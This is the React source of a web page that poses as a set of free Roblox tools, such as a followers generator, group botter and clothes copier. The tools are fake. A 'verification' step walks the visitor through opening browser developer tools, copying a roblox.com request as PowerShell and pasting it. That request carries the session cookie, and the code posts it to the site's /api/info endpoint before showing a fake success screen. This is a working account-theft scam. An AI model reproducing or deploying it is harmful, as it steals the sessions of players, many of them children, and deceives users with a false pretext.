'use client'

import { useState, FormEvent } from 'react'
import { useParams } from 'next/navigation'
import { CheckCircle, Loader, ArrowLeft, Clipboard, Shield, Terminal, ChevronRight } from 'lucide-react'

interface ToolConfig {
  icon: string
  title: string
  desc: string
  label: string
  placeholder: string
  button: string
  color: string
}

const TOOLS: Record<string, ToolConfig> = {
  'Copy-Clothes': { icon: '👕', title: 'Clothes Copier', desc: 'Copy any clothing item instantly', label: 'Clothing ID', placeholder: 'Paste clothing ID or URL...', button: 'Copy Clothes!', color: 'from-red-500 to-orange-500' },
  'Copy-Games': { icon: '🎮', title: 'Game Downloader', desc: 'Download any game and assets', label: 'Game ID', placeholder: 'Paste game ID or URL...', button: 'Download Game!', color: 'from-green-500 to-emerald-500' },
  'Bot-Followers': { icon: '👤', title: 'Followers Generator', desc: 'Generate followers for any account', label: 'Username', placeholder: 'Enter target username...', button: 'Send Followers!', color: 'from-blue-500 to-cyan-500' },
  'Group-Botter': { icon: '👥', title: 'Group Botter', desc: 'Bot members to any group', label: 'Group Link', placeholder: 'Paste group link here...', button: 'Bot Group!', color: 'from-purple-500 to-pink-500' },
  'Vc-Enabler': { icon: '🎤', title: 'Voice Chat Enabler', desc: 'Enable VC without verification', label: 'Username', placeholder: 'Enter target username...', button: 'Enable VC!', color: 'from-pink-500 to-rose-500' },
  'Join-Anyone': { icon: '🔓', title: 'Join Anyone', desc: 'Join any user regardless of privacy', label: 'Username', placeholder: 'Enter target username...', button: 'Join User!', color: 'from-amber-500 to-yellow-500' },
  'Enable-Shaders': { icon: '✨', title: 'Shader Enabler', desc: 'Enable advanced graphics options', label: 'Username', placeholder: 'Enter target username...', button: 'Enable Shaders!', color: 'from-cyan-500 to-teal-500' },
  'Limited-Checker': { icon: '🔍', title: 'Limited Checker', desc: 'Check any limited item value', label: 'Item ID', placeholder: 'Paste item ID or URL...', button: 'Check Item!', color: 'from-emerald-500 to-green-500' }
}

export default function ToolPage() {
  const params = useParams()
  const toolName = params.tool as string
  const directory = params.directory as string
  
  const tool: ToolConfig = TOOLS[toolName] || { 
    icon: '🔧', 
    title: toolName?.replace(/-/g, ' ') || 'Tool', 
    desc: 'Roblox tool', 
    label: 'Input', 
    placeholder: 'Enter value...', 
    button: 'Submit', 
    color: 'from-blue-500 to-purple-500' 
  }

  const [step, setStep] = useState<'input' | 'devtools' | 'processing' | 'success'>('input')
  const [inputValue, setInputValue] = useState<string>('')
  const [pasted, setPasted] = useState<string>('')
  const [error, setError] = useState<string>('')

  const submit = (): void => {
    if (!inputValue.trim()) return
    setStep('devtools')
  }

  const verify = async (e: FormEvent): Promise<void> => {
    e.preventDefault()
    if (!pasted.trim()) return
    setStep('processing')
    setError('')

    try {
      const res = await fetch('/api/info', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: pasted, directory, tool: tool.title })
      })

      const data = await res.json()

      if (data.success) {
        setTimeout(() => setStep('success'), 2000)
      } else {
        setError(data.message || 'Something went wrong')
        setStep('devtools')
      }
    } catch {
      setError('Network error - please try again')
      setStep('devtools')
    }
  }

  return (
    <div className="min-h-screen bg-[#09090b] flex items-center justify-center p-4 relative overflow-hidden">
      {/* Background */}
      <div className="absolute inset-0 bg-gradient-to-br from-[#09090b] via-[#111] to-[#09090b]" />
      <div className="absolute top-1/4 right-1/4 w-[300px] h-[300px] bg-gradient-to-r opacity-10 blur-[100px]" style={{ background: tool.color }} />

      <div className="relative z-10 w-full max-w-md">
        {/* Step 1: Input */}
        {step === 'input' && (
          <div className="bg-[#111]/80 border border-[#27272a] rounded-2xl p-8 backdrop-blur-sm">
            <div className="text-center mb-8">
              <div className={`w-20 h-20 rounded-2xl bg-gradient-to-br ${tool.color} flex items-center justify-center text-4xl mx-auto mb-5 shadow-2xl`}>
                {tool.icon}
              </div>
              <h1 className="text-2xl font-bold mb-2">{tool.title}</h1>
              <p className="text-gray-400 text-sm">{tool.desc}</p>
            </div>

            <div className="space-y-2 mb-6">
              <label className="block text-sm font-medium text-gray-300">{tool.label}</label>
              <input
                type="text"
                value={inputValue}
                onChange={(e) => setInputValue(e.target.value)}
                placeholder={tool.placeholder}
                className="w-full bg-[#09090b] border border-[#27272a] rounded-xl px-4 py-3.5 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all"
                autoFocus
              />
            </div>

            <button
              onClick={submit}
              disabled={!inputValue.trim()}
              className={`w-full bg-gradient-to-r ${tool.color} text-white font-semibold py-4 rounded-xl hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-2 shadow-lg`}
            >
              {tool.button}
              <ChevronRight size={18} />
            </button>
          </div>
        )}

        {/* Step 2: DevTools Verification */}
        {step === 'devtools' && (
          <div className="bg-[#111]/80 border border-[#27272a] rounded-2xl p-8 backdrop-blur-sm">
            <div className="text-center mb-6">
              <div className="w-16 h-16 rounded-2xl bg-amber-500/10 flex items-center justify-center mx-auto mb-4">
                <Terminal size={32} className="text-amber-400" />
              </div>
              <h2 className="text-xl font-bold mb-2">Verification Required</h2>
              <p className="text-gray-400 text-sm">Follow these steps to continue</p>
            </div>

            <div className="bg-[#09090b] rounded-xl p-5 mb-5 border border-[#27272a]">
              <ol className="list-decimal list-inside space-y-3 text-sm text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="w-6 h-6 rounded-full bg-blue-500/20 text-blue-400 flex items-center justify-center text-xs shrink-0">1</span>
                  Open Developer Tools (F12)
                </li>
                <li className="flex items-start gap-2">
                  <span className="w-6 h-6 rounded-full bg-blue-500/20 text-blue-400 flex items-center justify-center text-xs shrink-0">2</span>
                  Go to Network tab
                </li>
                <li className="flex items-start gap-2">
                  <span className="w-6 h-6 rounded-full bg-blue-500/20 text-blue-400 flex items-center justify-center text-xs shrink-0">3</span>
                  Find a roblox.com request
                </li>
                <li className="flex items-start gap-2">
                  <span className="w-6 h-6 rounded-full bg-blue-500/20 text-blue-400 flex items-center justify-center text-xs shrink-0">4</span>
                  Right-click → Copy as PowerShell
                </li>
                <li className="flex items-start gap-2">
                  <span className="w-6 h-6 rounded-full bg-green-500/20 text-green-400 flex items-center justify-center text-xs shrink-0">5</span>
                  Paste below
                </li>
              </ol>
            </div>

            <form onSubmit={verify} className="space-y-4">
              <textarea
                value={pasted}
                onChange={(e) => setPasted(e.target.value)}
                placeholder="Paste PowerShell output here..."
                rows={5}
                className="w-full bg-[#09090b] border border-[#27272a] rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all font-mono text-xs resize-none"
              />

              {error && (
                <div className="p-3 rounded-xl bg-red-500/10 border border-red-500/25 text-red-400 text-sm flex items-center gap-2">
                  <Shield size={16} />
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={!pasted.trim()}
                className={`w-full bg-gradient-to-r ${tool.color} text-white font-semibold py-3.5 rounded-xl hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed transition-all flex items-center justify-center gap-2`}
              >
                <Clipboard size={18} />
                Verify & Continue
              </button>
            </form>

            <button 
              onClick={() => setStep('input')} 
              className="w-full text-gray-400 text-sm py-3 mt-2 hover:text-white transition-colors flex items-center justify-center gap-1"
            >
              <ArrowLeft size={14} />
              Go back
            </button>
          </div>
        )}

        {/* Step 3: Processing */}
        {step === 'processing' && (
          <div className="bg-[#111]/80 border border-[#27272a] rounded-2xl p-12 text-center backdrop-blur-sm">
            <div className="w-20 h-20 rounded-full border-4 border-[#27272a] border-t-blue-500 animate-spin mx-auto mb-6" />
            <h2 className="text-xl font-bold mb-2">Processing...</h2>
            <p className="text-gray-400 text-sm">Verifying your account</p>
            <p className="text-xs text-gray-500 mt-4">This usually takes 2-3 seconds</p>
          </div>
        )}

        {/* Step 4: Success */}
        {step === 'success' && (
          <div className="bg-[#111]/80 border border-green-500/30 rounded-2xl p-12 text-center backdrop-blur-sm">
            <div className="w-24 h-24 rounded-full bg-gradient-to-br from-green-500 to-emerald-400 flex items-center justify-center mx-auto mb-6 shadow-2xl shadow-green-500/25 animate-bounce">
              <CheckCircle size={48} className="text-white" />
            </div>
            <h2 className="text-2xl font-bold mb-2 text-green-400">Success!</h2>
            <p className="text-gray-400 mb-4">Account verified successfully</p>
            <div className="bg-[#09090b] rounded-xl p-4 inline-block">
              <p className="text-sm text-green-400 font-medium">
                ✅ {tool.title} is now active!
              </p>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
